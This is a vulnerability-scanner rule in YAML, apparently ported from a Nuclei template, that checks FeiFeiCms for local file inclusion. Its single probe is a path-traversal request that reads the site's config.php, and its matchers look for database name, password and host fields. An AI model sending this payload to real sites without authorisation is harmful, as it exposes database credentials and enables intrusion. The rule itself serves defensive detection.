schema_version: 1
id: "cortex.community:feifeicms-lfr"
rule_version: "1.0.0"
requires:
  engine_api: 1
  capabilities: ["http.standard.v1", "matchers.basic.v1", "proof.signal.v1"]
info:
  name: "FeiFeiCms - Local File Inclusion"
  description: "FeiFeiCms is vulnerable to local file inclusion. Auto-ported from a Nuclei template by nuclei2cdl. Certainty is LIKELY: a ported matcher has no baseline/differential proof, so it is a signal, not a confirmed exploit. Review before use."
  references:
    - "https://www.cnblogs.com/jinqi520/p/10202615.html"
    - "https://gitee.com/daicuo/feifeicms"
  cwes: [22]
  tags: ["feifeicms", "lfi", "vuln", "nuclei", "auto-ported", "signal"]
  remediation: "See the referenced advisory / template source for remediation."
finding:
  sink_type: "VULNERABLE_COMPONENT"
  impact: "INFORMATION_DISCLOSURE"
  severity: "High"
  root_cause: "nuclei-ported-signal"
execution: { auth: "anonymous", side_effects: "read_only", transport: "http" }
steps:
  - id: "probe0"
    request: { method: "GET", path: "/index.php?s=Admin-Data-down&id=../../Conf/config.php" }
proof:
  kind: "signal.v1"
  assertions:
    all:
      - eq: { left: { ref: "steps.probe0.status" }, right: { value: 200 } }
      - all:
          - contains: { left: { ref: "steps.probe0.body" }, right: { value: "<?php" } }
          - contains: { left: { ref: "steps.probe0.body" }, right: { value: "db_name" } }
          - contains: { left: { ref: "steps.probe0.body" }, right: { value: "db_pwd" } }
          - contains: { left: { ref: "steps.probe0.body" }, right: { value: "db_host" } }
